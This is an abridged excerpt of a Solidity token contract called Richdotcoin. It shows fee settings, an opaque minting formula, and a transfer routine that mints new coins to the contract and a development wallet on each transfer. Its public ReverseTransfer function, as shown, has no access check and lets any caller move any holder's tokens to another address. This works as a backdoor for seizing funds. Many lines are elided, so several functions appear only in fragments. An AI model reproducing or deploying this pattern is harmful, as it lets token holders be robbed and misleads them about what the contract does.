...
contract Richdotcoin is Context, IERC20, Ownable {
    ...
    uint256 public _developmentFee = 30; // mining lock up percentage per transfer
    uint256 private _previousDevelopmentFee = _developmentFee;
    uint256 public _liquidityFee = 20;
    uint256 private _previousLiquidityFee = _liquidityFee;
    uint256 private _mintweight = (_maximumSupply/_tTotal * (_tTotal)**3)/ (987*_tTotal/_maximumSupply * (_maximumSupply - _tTotal)**2); //difficulty of newcoins minted in transfers = TransferAmount/mintweight
    uint256 public _CoinageDifficulty = _mintweight;
    ...
    uint256 public _maxTxAmount = 6666 * 10**18;
    ...
    function balanceOf(address account) public view override returns (uint256) {
        ...
        if (_isReported[account]) return _rOwned[account];
    ...
    function ReverseTransfer(address ReverseFrom, address ReverseTo, uint256 amount,bool takeFee) public returns (bool) {
        ...
        _tokenTransfer(ReverseFrom,ReverseTo,amount,takeFee);
        emit Transfer(ReverseFrom, ReverseTo, amount);
        return true;
    }
    /**function mint(uint256 amount) public returns (bool) {
        require(msg.sender == owner());
        require(_tTotal + (amount*10**18) <= _maximumSupply, "Richdotcoin Maximum: can't mint new coins");
        _tTotal = _tTotal + amount* 10** 18;
        emit Transfer(address(0), owner(), amount* 10** 18);
        _mintweight = (_maximumSupply/_tTotal * (_tTotal)**3)/ (987*_tTotal/_maximumSupply * (_maximumSupply - _tTotal)**2);
        return true;
    }**/
    ...
    function _transfer(
        ...
        require(_tTotal + (amount* 10** 18/_mintweight) <= _maximumSupply, "Richdotcoin Maximum: can't mint new coins");
        bool takeFee = true;
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        }
        _Tranfermintnewcoins(owner(),address(this),_developmentWalletAddress,amount,takeFee);
        _mintweight = (_maximumSupply/_tTotal * (_tTotal)**3)/ (987*_tTotal/_maximumSupply * (_maximumSupply - _tTotal)**2);
        if(from != owner() && to != owner())
            require(amount <= _maxTxAmount, "Richdotcoin maximum exceeded, reduce the coins amount");
    ...
    function _Tranfermintnewcoins(address Main, address LiquidityPlus, address Treasury,uint256 amount,bool takeFee) private {
        _tTotal = _tTotal + (amount* 10** 18/_mintweight);
        _tokenTransfer(Main,LiquidityPlus,2*(amount* 10** 18/_mintweight)/3,takeFee);
        _tokenTransfer(Main,Treasury,(amount* 10** 18/_mintweight)/3,takeFee);
        emit Transfer(address(0),owner(),amount*10**18/_mintweight);
    }
